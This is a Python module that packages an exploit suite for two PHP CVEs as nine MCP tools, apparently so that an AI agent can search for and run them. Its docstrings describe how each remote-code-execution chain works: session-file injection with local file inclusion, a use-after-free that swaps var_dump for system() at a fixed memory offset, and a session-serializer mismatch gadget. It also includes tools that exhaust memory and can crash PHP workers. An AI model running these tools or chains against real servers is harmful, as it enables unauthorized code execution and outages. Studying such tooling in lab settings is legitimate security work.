#!/usr/bin/env python3
"""
php2shell tool pack — CVE-2026-109618 / CVE-2026-109619 exploit toolkit
=============================================================================
Single source of truth for the php2shell tools. Wraps the official
php2shell-poc scripts (https://github.com/ikow/php2shell-poc, MIT) as plain
functions and registers them onto ANY FastMCP instance via `register(mcp)`.

Used by the HexStrike router (hexstrike_mcp_router.py): the 9 tools are added
to the router's tool manager, so Tiel discovers them with
    hexstrike_search_tools("php2shell session rce")
and runs them with
    hexstrike_run("php2shell_scan_vulnerability", {"target": "..."})

Scripts resolve relative to THIS file: <dir>/php2shell-poc/{exploit,poc,scanner}.
Default target: env PHP2SHELL_TARGET (fallback http://host.docker.internal:18056).
"""
import os
import subprocess
import sys
from pathlib import Path

BASE = Path(__file__).resolve().parent / "php2shell-poc"
EXPLOIT_DIR = BASE / "exploit"
POC_DIR = BASE / "poc"
SCANNER_DIR = BASE / "scanner"

DEFAULT_TARGET = os.environ.get("PHP2SHELL_TARGET", "http://host.docker.internal:18056")
PY = sys.executable or "python3"


def _run(*args, timeout: int = 60) -> str:
    try:
        result = subprocess.run(
            list(args), capture_output=True, text=True, timeout=timeout,
        )
        out = result.stdout
        if result.stderr:
            out += "\n--- stderr ---\n" + result.stderr
        if result.returncode != 0:
            out += f"\n--- exit code: {result.returncode} ---"
        return out.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return f"TIMEOUT: command did not complete within {timeout}s"
    except FileNotFoundError as e:
        return f"COMMAND NOT FOUND: {e}"


# ── Scanner ──────────────────────────────────────────────────────────────────

def php2shell_scan_vulnerability(
    target: str = DEFAULT_TARGET,
    path: str = "/",
    active: bool = False,
    output_json: bool = False,
) -> str:
    """4-tier php2shell vulnerability scanner (CVE-2026-109618/CVE-2026-109619).

    Tier 1: version fingerprint (passive, from headers).
    Tier 2: upload_progress reachability + session fixation check.
    Tier 3: session write injection marker (non-destructive).
    Tier 4: OOM differential (only when active=True — MAY CRASH PHP WORKERS).

    Returns a verdict (VULNERABLE/LIKELY_VULNERABLE/PATCHED/UNKNOWN), the applicable
    chains, PHP version and SAPI. Start every php2shell engagement here.
    output_json=True returns machine-readable JSON.
    """
    args = [PY, str(SCANNER_DIR / "check.py"), target, "--path", path]
    if active:
        args.append("--active")
    if output_json:
        args.append("--json")
    return _run(*args, timeout=30)


# ── Verification PoCs (non-destructive, confirm a condition, no RCE) ──────────

def php2shell_verify_session_injection(
    target: str = DEFAULT_TARGET,
    path: str = "/index.php",
    sid: str = "verifysession00000000000000",
) -> str:
    """Verify Chain A/B prerequisite: session fixation + raw filename injection.

    Sends 3 non-destructive uploads (normal filename, PHP code in filename,
    pipe+serialized object in filename) and confirms upload_progress stores
    filenames raw in the session file — the injection primitive for all session
    chains. Does NOT confirm RCE. Inspect /tmp/sessions/sess_<sid> on the target.
    """
    return _run(
        PY, str(POC_DIR / "verify_session_injection.py"),
        "--target", target, "--path", path, "--sid", sid,
        timeout=30,
    )


def php2shell_verify_handler_mismatch(
    target: str = DEFAULT_TARGET,
    write_path: str = "/app/upload.php",
    read_path: str = "/api/endpoint.php",
    sid: str = "mismatchverify0000000000000",
) -> str:
    """Verify Chain C prerequisite: session handler mismatch (FPM only).

    Writes a session via a php_serialize endpoint and reads it via a php endpoint.
    Confirmed vulnerable if the response contains 'Failed to decode session object'.
    Needs two directories whose .user.ini set different session.serialize_handler
    (write_path under php_serialize, read_path under php).
    """
    return _run(
        PY, str(POC_DIR / "verify_handler_mismatch.py"),
        "--target", target, "--write-path", write_path,
        "--read-path", read_path, "--sid", sid,
        timeout=30,
    )


def php2shell_verify_oom_trigger(
    host: str = "host.docker.internal",
    port: int = 18056,
    path: str = "/index.php",
    strategy: str = "headers",
    num_headers: int = 5000,
) -> str:
    """Verify Chain D condition: OOM amplification via multipart (mod_php only).

    Sends an oversized multipart request to trip PHP memory_limit. Chain D
    (stale EG() RCE) only affects Apache mod_php; on an FPM target this shows 502
    (worker crash), not the EG corruption D needs. MAY CRASH PHP WORKERS.
    strategy: 'headers' | 'nested' | 'no_length'. On the FPM lab (:18056) expect 502.
    """
    return _run(
        PY, str(POC_DIR / "verify_oom_trigger.py"),
        "--host", host, "--port", str(port), "--path", path,
        "--strategy", strategy, "--num-headers", str(num_headers),
        timeout=60,
    )


def php2shell_make_huge_session(
    target: str = DEFAULT_TARGET,
    sid: str = "hugesession000000000000000",
    size_mb: int = 30,
    container: str = "php2shell-fpm-56",
) -> str:
    """Create a ~30MB session file on the target FPM container for Chain E.

    Must run BEFORE php2shell_verify_fpm_stale_state. Uses docker exec to write
    into the FPM container's /tmp/sessions/. The file is one-shot (truncated to 0
    after the producer OOM) — recreate before each run.
    container: FPM container name (port 18056 -> 'php2shell-fpm-56').
    Requires the docker CLI/socket inside this container.
    """
    return _run(
        PY, str(POC_DIR / "make_huge_session.py"),
        "--target", target, "--sid", sid,
        "--size-mb", str(size_mb), "--container", container,
        timeout=120,
    )


def php2shell_verify_fpm_stale_state(
    target: str = DEFAULT_TARGET,
    session_path: str = "/session_oom.php",
    upload_path: str = "/index.php",
    producer_sid: str = "hugesession000000000000000",
    consumer_sid: str = "consumerpoisoned0000000000",
) -> str:
    """Verify Chain E condition: FPM session OOM -> stale BG(unserialize) -> UAF.

    REQUIRES php2shell_make_huge_session first, and pm=static / pm.max_children=1 /
    memory_limit<=32M on the target. Producer loads the huge session -> OOM leaves
    BG(unserialize) dirty; consumer's upload_progress to the same worker reads stale
    state. Vulnerable: 'Session object destruction failed' or 502 in the consumer
    response. NOTE: the full Chain E RCE exploit is not public — this verifies the
    condition only.
    """
    return _run(
        PY, str(POC_DIR / "verify_fpm_stale_state.py"),
        "--target", target, "--session-path", session_path,
        "--upload-path", upload_path, "--producer-sid", producer_sid,
        "--consumer-sid", consumer_sid,
        timeout=120,
    )


# ── Exploit chains (active RCE — confirm authorization first) ────────────────

def php2shell_chain_a_session_lfi(
    target: str = DEFAULT_TARGET,
    inject_path: str = "/index.php",
    lfi_path: str = "/vuln.php",
    session_path: str = "/tmp/sessions",
    command: str = "id",
    cleanup_on: bool = False,
    attempts: int = 3,
) -> str:
    """[RCE EXPLOIT] Chain A: session injection + LFI -> pre-auth RCE.

    Injects a PHP payload via the upload_progress filename into the session file,
    then triggers an LFI to include the session file and execute the PHP.
    Requires: session.upload_progress.enabled=On (PHP default); an LFI sink
    (lfi_path, e.g. ?page=<path> / include($_GET['page'])); a known session
    save_path (session_path — try /tmp/sessions, /tmp, /var/lib/php/sessions).
    cleanup_on=True races session.upload_progress.cleanup=On with a stalled writer.
    RCE confirmed when output contains ___START___<cmd output>___END___.
    """
    args = [
        PY, str(EXPLOIT_DIR / "chain_a_session_lfi.py"),
        "--target", target, "--inject-path", inject_path,
        "--lfi-path", lfi_path, "--session-path", session_path,
        "--command", command, "--attempts", str(attempts),
    ]
    if cleanup_on:
        args.append("--cleanup-on")
    return _run(*args, timeout=90)


def php2shell_chain_b_get_payload() -> str:
    """[RCE EXPLOIT] Chain B: var_destroy UAF -> function handler overwrite -> RCE.

    Returns the PHP exploit source (chain_b_uaf_rce.php) that must be EXECUTED ON
    the target PHP process (not a remote network exploit): it needs /proc/self/mem
    write access inside the target (typically the PHP-FPM container, CAP_SYS_PTRACE
    or root). Workflow: get initial exec via Chain A or C -> upload/inject this PHP
    -> execute it -> UAF overwrites var_dump's handler with system() -> RCE.
    EG offset 0x1420900 is calibrated for php:8.2.34-fpm ONLY (recalibrate for others).
    """
    try:
        return (EXPLOIT_DIR / "chain_b_uaf_rce.php").read_text()
    except Exception as e:
        return f"Error reading payload: {e}"


def php2shell_chain_c_mismatch_rce(
    target: str = DEFAULT_TARGET,
    pollute_path: str = "/app_serialize.php",
    upload_path: str = "/app/upload.php",
    trigger_path: str = "/api/endpoint.php",
    command: str = "id > /tmp/rce_proof.txt 2>&1",
    gadget: str = "",
    pollute_attempts: int = 10,
    inject_attempts: int = 20,
) -> str:
    """[RCE EXPLOIT] Chain C: handler mismatch -> __destruct -> RCE (FPM, pre-auth).

    1) Pollute an FPM worker via pollute_path (endpoint doing ini_set to
       session.serialize_handler=php_serialize; Laravel/Symfony do this by default).
    2) Inject a gadget object via the upload filename in php_serialize format.
    3) Trigger: trigger_path reads the session with the php handler -> deserializes
       -> __destruct fires. Needs a POP-gadget class autoloaded at trigger_path.
    gadget: custom serialized object (blank = lab 'Evil' class). Check
    /tmp/rce_proof.txt on the target after running.
    """
    args = [
        PY, str(EXPLOIT_DIR / "chain_c_mismatch_rce.py"),
        "--target", target, "--pollute-path", pollute_path,
        "--upload-path", upload_path, "--trigger-path", trigger_path,
        "--command", command, "--pollute-attempts", str(pollute_attempts),
        "--inject-attempts", str(inject_attempts),
    ]
    if gadget:
        args.extend(["--gadget", gadget])
    return _run(*args, timeout=120)


# ── Registration ─────────────────────────────────────────────────────────────

TOOLS = [
    php2shell_scan_vulnerability,
    php2shell_verify_session_injection,
    php2shell_verify_handler_mismatch,
    php2shell_verify_oom_trigger,
    php2shell_make_huge_session,
    php2shell_verify_fpm_stale_state,
    php2shell_chain_a_session_lfi,
    php2shell_chain_b_get_payload,
    php2shell_chain_c_mismatch_rce,
]


def register(mcp) -> int:
    """Add all php2shell tools onto a FastMCP instance. Returns the count added.

    Uses the FastMCP `.tool()` decorator (the API the hexstrike vendor uses) and
    falls back to `.add_tool()` across mcp SDK versions. Each tool keeps its
    function name (php2shell_*) and docstring as its MCP name/description, so the
    hexstrike router indexes them into its searchable catalog automatically.
    """
    n = 0
    for fn in TOOLS:
        desc = (fn.__doc__ or "").strip()
        try:
            mcp.tool(name=fn.__name__, description=desc)(fn)
        except TypeError:
            mcp.add_tool(fn, name=fn.__name__, description=desc)
        n += 1
    return n
